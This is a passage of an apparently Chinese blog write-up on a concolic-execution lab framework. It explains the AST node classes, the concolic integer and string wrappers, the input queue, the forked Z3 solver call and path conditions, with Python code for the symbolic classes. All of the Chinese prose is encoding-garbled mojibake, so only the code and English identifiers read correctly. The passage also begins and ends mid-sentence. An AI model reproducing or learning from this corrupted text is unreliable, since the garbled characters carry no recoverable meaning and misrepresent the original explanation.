è¡¨ç¤ºæ•´å‹è¡¨è¾¾å¼ <code>a + b</code>ï¼‰</p><p>æ¯ä¸ª AST èŠ‚ç‚¹ <code>n</code> éƒ½å¯ä»¥ä½¿ç”¨ <code>z3expr(n)</code> è½¬åŒ–ä¸º Z3 è¡¨è¾¾å¼ï¼Œè¿™ç”±è°ƒç”¨ <code>n._z3expr</code> å®Œæˆï¼Œå³æ¯ä¸ª AST èŠ‚ç‚¹éƒ½å®ç°äº†è¿”å›å¯¹åº” Z3 è¡¨è¾¾å¼çš„ <code>_z3expr</code> æ–¹æ³•</p><p>æˆ‘ä»¬ä½¿ç”¨è‡ªå·±çš„ AST å±‚è€Œéä½¿ç”¨ Z3 çš„ç¬¦å·è¡¨ç¤ºçš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦å®ç°ä¸€äº› Z3 è¡¨ç¤ºéš¾ä»¥å®Œæˆçš„æ“ä½œï¼Œæ­¤å¤–æˆ‘ä»¬éœ€è¦åˆ†å‡ºä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è°ƒç”¨ Z3 çš„æ±‚è§£å™¨ï¼Œä»¥åœ¨ Z3 æ±‚è§£å™¨è€—æ—¶è¿‡é•¿æ—¶æ€æ­»è¿›ç¨‹â€”â€”å°†çº¦æŸå½’ä¸ºä¸å¯è§£ï¼ˆè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½å¤±å»è¿™äº›è·¯å¾„ï¼Œä½†è‡³å°‘æˆ‘ä»¬ä¼šè®©ç¨‹åºæ¢ç´¢å…¶ä»–è·¯å¾„ï¼‰ï¼›ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ AST èƒ½è®©æˆ‘ä»¬å°† Z3 çŠ¶æ€å®Œå…¨ç‹¬ç«‹åœ¨ fork å‡ºçš„è¿›ç¨‹é‡Œ</p></li><li><p><strong>æ··åˆå°è£…</strong>ï¼ˆThe concolic wrappersï¼‰ï¼šä¸ºäº†æ‹¦æˆª python-level çš„æ“ä½œå¹¶è¿›è¡Œæ··åˆæ‰§è¡Œï¼Œæˆ‘ä»¬å°†å¸¸è§„çš„ <code>int</code> ä¸ <code>str</code> å¯¹è±¡æ›¿æ¢æˆäº†æ··åˆçš„å­ç±»ï¼š<code>concolic_int</code> ç»§æ‰¿è‡ª <code>int</code> è€Œ <code>concolic_str</code> ç»§æ‰¿è‡ª <code>str</code>ï¼Œæ¯ä¸€ä¸ªæ··åˆå°è£…éƒ½åŒæ—¶å­˜å‚¨ä¸€ä¸ªå…·ä½“å€¼ï¼ˆ<code>self.__v</code> ï¼‰ä¸ä¸€ä¸ªç¬¦å·è¡¨è¾¾å¼ï¼ˆä¸ AST èŠ‚ç‚¹ï¼Œåœ¨ <code>self.__sym</code>ï¼‰ï¼Œå½“åº”ç”¨åœ¨è®¡ç®—æ··åˆå€¼è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ <code>a+1</code> ä¸­çš„ <code>a</code> ä¸º <code>concolic_int</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‹¦æˆªè¯¥æ“ä½œå¹¶è¿”å›ä¸€ä¸ªåŒæ—¶åŒ…å«å…·ä½“å€¼ä¸ç¬¦å·è¡¨è¾¾å¼çš„çš„æ··åˆå€¼</p><p>ä¸ºäº†å®ç°è¿™æ ·çš„æ‹¦æˆªæ“ä½œï¼Œæˆ‘ä»¬é‡è½½äº† <code>concolic_int</code> ä¸ <code>concolic_str</code> ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚ <code>concolic_int.__add__</code> åœ¨ä¸Šé¢çš„ä¾‹å­ <code>a + 1</code> ä¸­ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ··åˆå€¼è¡¨ç¤ºç»“æœ</p><p>åŸåˆ™ä¸Šæˆ‘ä»¬åº”è¯¥ä¹Ÿè¦æœ‰ä¸€ä¸ª <code>concolic_bool</code> ä½œä¸º <code>bool</code> çš„å­ç±»ï¼Œä¸å¹¸çš„æ˜¯åœ¨ Python ä¸­ <code>bool</code> ä¸èƒ½è¢«ç»§æ‰¿ï¼ˆå‚è§<a href="https://docs.python.org/3/library/functions.html#bool">è¿™é‡Œ</a> ä¸ <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">è¿™é‡Œ</a>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬åˆ›å»ºäº†å‡½æ•° <code>concolic_bool</code> ä½œä¸ºä»£æ›¿ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ··åˆå¸ƒå°”å€¼æ—¶ï¼Œç¨‹åºä¼šæŒ‰å…¶å€¼è¿›è¡Œåˆ†æ”¯ï¼Œæ•… <code>concolic_bool</code> ä¹Ÿä¼šä¸ºå½“å‰è·¯å¾„æ¡ä»¶æ·»åŠ ä¸€ä¸ªçº¦æŸï¼ˆå¸ƒå°”å€¼çš„ç¬¦å·è¡¨è¾¾å¼ä¸å…·ä½“å€¼ç›¸ç­‰çš„çº¦æŸï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå…·ä½“çš„å¸ƒå°”å€¼</p></li><li><p><strong>å…·ä½“è¾“å…¥</strong>ï¼ˆThe concrete inputsï¼‰ï¼šåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ <code>concrete_values</code> å­—å…¸ä¸­ï¼Œåœ¨è¯¥å­—å…¸ä¸­å­˜å‚¨äº†ç¨‹åºè¾“å…¥çš„å­—ç¬¦ä¸²åå­—ï¼Œå¹¶å°†æ¯ä¸ªåå­—æ˜ å°„åˆ°å¯¹åº”çš„è¾“å…¥å€¼ï¼ˆæ•´å‹å˜é‡çš„å€¼ä¸ºpythonæ•´å‹ï¼Œå­—ç¬¦ä¸²å˜é‡ä¸ºpythonå­—ç¬¦ä¸²ï¼‰</p><p><code>concrete_value</code> è¢«è®¾ä¸ºå…¨å±€å˜é‡çš„åŸå› æ˜¯åº”ç”¨é€šè¿‡è°ƒç”¨ <code>fuzzy.mk_str(name)</code> æˆ– <code>fuzzy.mk_int(name)</code> æ¥åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸²æˆ–æ··åˆæ•´å‹ï¼Œå…¶è¿”å›ä¸€ä¸ªæ··åˆå€¼ï¼Œå…¶ä¸­çš„ç¬¦å·éƒ¨åˆ†ä¸ºä¸€ä¸ªæ–°çš„ AST èŠ‚ç‚¹å¯¹åº”åˆ°ä¸€ä¸ªåä¸º <code>name</code> çš„å˜é‡ï¼Œä½†å…·ä½“å€¼è¢«åœ¨ <code>concrete_values</code> ä¸­æŸ¥æ‰¾ï¼Œè‹¥å­—å…¸ä¸­æ²¡æœ‰ä¸ä¹‹å…³è”çš„å˜é‡ï¼Œç³»ç»Ÿå°†å…¶è®¾ä¸ºé»˜è®¤çš„åˆå§‹å€¼ï¼ˆæ•´å‹ä¸º0ï¼Œå­—ç¬¦ä¸²ä¸ºç©ºä¸²ï¼‰</p><p>æ··åˆæ‰§è¡Œæ¡†æ¶åœ¨ä¸€ä¸ª <code>InputQueue</code> å¯¹è±¡ä¸­ç»´æŒä¸€ä¸ªå¾…å°è¯•çš„ä¸åŒè¾“å…¥çš„é˜Ÿåˆ—ï¼Œæ¡†æ¶é¦–å…ˆä¼šæ·»åŠ ä¸€ä¸ªåˆå§‹è¾“å…¥ï¼ˆç©ºå­—å…¸ <code>&#123;&#125;</code>ï¼‰ï¼Œä¹‹åæ‰§è¡Œä»£ç ï¼Œè‹¥åº”ç”¨è¿›å…¥äº†åˆ†æ”¯ï¼Œæ··åˆæ‰§è¡Œç³»ç»Ÿå°†å”¤é†’ Z3 æ¥å¸¦æ¥ æ–°çš„è¾“å…¥ä»¥æµ‹è¯•ä»£ç ä¸­çš„å…¶ä»–åˆ†æ”¯ï¼Œå°†è¿™äº›è¾“å…¥æ”¾åˆ°è¾“å…¥é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¿æŒè¿­ä»£ç›´åˆ°æ²¡æœ‰è¾“å…¥å¯ä»¥å°è¯•</p></li><li><p><strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆThe SMT solverï¼‰ï¼š <code>fork_and_check(c)</code> å‡½æ•°ä¼šæ£€æŸ¥çº¦æŸ <code>c</code> ï¼ˆä¸€ä¸ª AST èŠ‚ç‚¹ï¼‰æ˜¯å¦ä¸ºå¯æ»¡è¶³çš„è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›ä¸€å¯¹å€¼ï¼šå¯æ»¡è¶³æ€§çŠ¶æ€ <code>ok</code> åŠç¤ºä¾‹æ¨¡å‹ï¼ˆåˆ†é…ç»™å˜é‡çš„å€¼ï¼‰ï¼Œè‹¥çº¦æŸå¯ä»¥è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.sat</code> ï¼Œè‹¥çº¦æŸä¸å¯è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.unsat</code> æˆ– <code>z3.unknown</code>ï¼›è¯¥å‡½æ•°å†…éƒ¨ä¼š fork ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è¿è¡Œ Z3 æ±‚è§£å™¨ï¼Œè‹¥è€—æ—¶è¶…è¿‡ <code>z3_timeout</code> åˆ™æ€æ­»è¿›ç¨‹å¹¶è¿”å› <code>z3.unknown</code></p></li><li><p><strong>å½“å‰è·¯å¾„æ¡ä»¶</strong>ï¼ˆThe current path conditionï¼‰ï¼šå½“åº”ç”¨æ‰§è¡Œå¹¶åŸºäºæ··åˆå€¼å†³å®šæ§åˆ¶æµæ—¶ï¼ˆå‚è§ä¸Šé¢å…³äº <code>concolic_bool</code> çš„è®¨è®ºï¼‰ï¼Œè¡¨ç¤ºè¯¥åˆ†æ”¯çš„çº¦æŸä¼šè¢«æ·»åŠ åˆ° <code>cur_path_constr</code> åˆ—è¡¨ä¸­ï¼Œä¸ºäº†ç”Ÿæˆèƒ½å¤Ÿæ²¿ç€ä¸€æ¡åˆ†æ”¯ä»ä¸€ä¸ªç‚¹è¿›è¡Œä¸åŒé€‰æ‹©çš„è¾“å…¥ï¼Œæ‰€éœ€çš„çº¦æŸä¸ºè·¯å¾„ä¸Šè¯¥ç‚¹ä¹‹å‰çš„çº¦æŸé›†åˆï¼ŒåŠ ä¸Šè¯¥ç‚¹çš„åå‘çº¦æŸï¼›ä¸ºäº†å¸®åŠ©è°ƒè¯•ä¸å¯å‘å¼æœç´¢ï¼Œè§¦å‘äº†åˆ†æ”¯çš„ä»£ç è¡Œçš„ä¿¡æ¯ä¼šè¢«å­˜æ”¾åœ¨ <code>cur_path_constr_callers</code> åˆ—è¡¨ä¸­</p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œæ˜¯å®Œæˆå¯¹ <code>concolic_int</code> çš„å®ç°ï¼Œå¹¶å°†ä»£ç åº”ç”¨äºæ··åˆæ‰§è¡Œå¾ªç¯çš„æ ¸å¿ƒï¼Œæœ¬ Lab æä¾›äº†ä¸¤ä¸ªæµ‹è¯•ç¨‹åºï¼š <code>check-concolic-int.py</code> ä¸ <code>check-symex-int.py</code></p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1</h3><p>åœ¨åš Exercise ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªæ··åˆæ‰§è¡Œæ¡†æ¶çš„ä»£ç ç»“æ„ï¼Œå…¶æ ¸å¿ƒä»£ç ä¸»è¦ä½äº <code>symex/fuzzy.py</code> ä¸­</p><h4 id="I-AST-èŠ‚ç‚¹"><a href="#I-AST-èŠ‚ç‚¹" class="headerlink" title="I. AST èŠ‚ç‚¹"></a>I. AST èŠ‚ç‚¹</h4><p>é¦–å…ˆæ˜¯ AST èŠ‚ç‚¹ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·ç±»çš„çˆ¶ç±»è€Œå­˜åœ¨ï¼Œå®šä¹‰æ¯”è¾ƒç®€å•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-ç¬¦å·è¿ç®—"><a href="#II-ç¬¦å·è¿ç®—" class="headerlink" title="II. ç¬¦å·è¿ç®—"></a>II. ç¬¦å·è¿ç®—</h4><p>ç„¶åæ˜¯ <code>sym_func_apply</code> ç±»ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·æ“ä½œçš„çˆ¶èŠ‚ç‚¹ï¼Œè¿™é‡Œä¸»è¦é‡è½½äº† <code>__eq__()</code> å’Œ <code>__hash__()</code> æ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸è®¡ç®—å“ˆå¸Œå€¼ï¼Œæ¯”è¾ƒçš„æ–¹æ³•å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ‰€æœ‰å‚æ•°ç›¸ç­‰ï¼Œå“ˆå¸Œå€¼çš„è®¡ç®—åˆ™æ˜¯æ‰€æœ‰å‚æ•°çš„å“ˆå¸Œå€¼è¿›è¡Œå¼‚æˆ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸‰ä¸ªç±» <code>sym_unop</code> ã€<code>sym_binop</code> ã€<code>sym_triop</code>ï¼Œè¡¨ç¤ºå¸¦æœ‰1ã€2ã€3ä¸ªæ“ä½œæ•°çš„å°è£…ï¼Œå¯ä»¥ä½¿ç”¨ <code>a</code> ã€<code>b</code> ã€<code>c</code> è·å¾—ç¬¬ 1ã€2ã€3ä¸ªæ“ä½œæ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>åŸºäº <code>sym_func_apply</code> ä¸ <code>op</code> ç±»ï¼Œå°è£…äº†ç›¸ç­‰æ¯”è¾ƒã€ä¸ã€æˆ–ã€éå››ä¸ªæ“ä½œï¼Œå…¶å®ç°åŸç†ä¸»è¦è¿˜æ˜¯è½¬æˆ Z3 è¡¨è¾¾å¼ååˆ©ç”¨ Z3 çš„ä¸æˆ–éè¿›è¡Œè¿ç®—ï¼šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>ç¬¦å·æ•°çš„åŠ å‡ä¹˜é™¤æ¯”è¾ƒç­‰æ“ä½œéƒ½æ˜¯åŸºäºä¸Šé¢å°è£…çš„ <code>op</code> ç±»å®Œæˆçš„ï¼š</p><blockquote><p>ä¹˜é™¤ç­‰è¿ç®—éœ€è¦æˆ‘ä»¬åœ¨åç»­çš„ Exercise ä¸­è‡ªè¡Œå®ç°</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-å¸¸é‡"><a href="#III-å¸¸é‡" class="headerlink" title="III. å¸¸é‡"></a>III. å¸¸é‡</h4><p>å­—ç¬¦ä¸²å¸¸é‡ <code>const_str</code> ã€æ•´å‹å¸¸é‡ <code>const_int</code> ã€å¸ƒå°”å¸¸é‡ <code>const_bool</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»§æ‰¿è‡ª <code>sym_ast</code> å¹¶ä¸”å‚¨å­˜å¯¹åº”çš„å€¼ï¼Œå…¶ä¸­å­—ç¬¦ä¸²å¸¸é‡åœ¨è½¬ä¸º Z3 è¡¨è¾¾å¼æ—¶ä¼šè°ƒç”¨ <code>z3.StringVal()</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-ç¬¦å·å˜é‡"><a href="#IV-ç¬¦å·å˜é‡" class="headerlink" title="IV. ç¬¦å·å˜é‡"></a>IV. ç¬¦å·å˜é‡</h4><p>åœ¨è¯¥æ¡†æ¶ä¸­å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ç¬¦å·å˜é‡ï¼š<code>sym_int</code> ä¸ <code>sym_str</code>ï¼Œéƒ½æ˜¯ç›´æ¥åŸºç¡€è‡ª AST 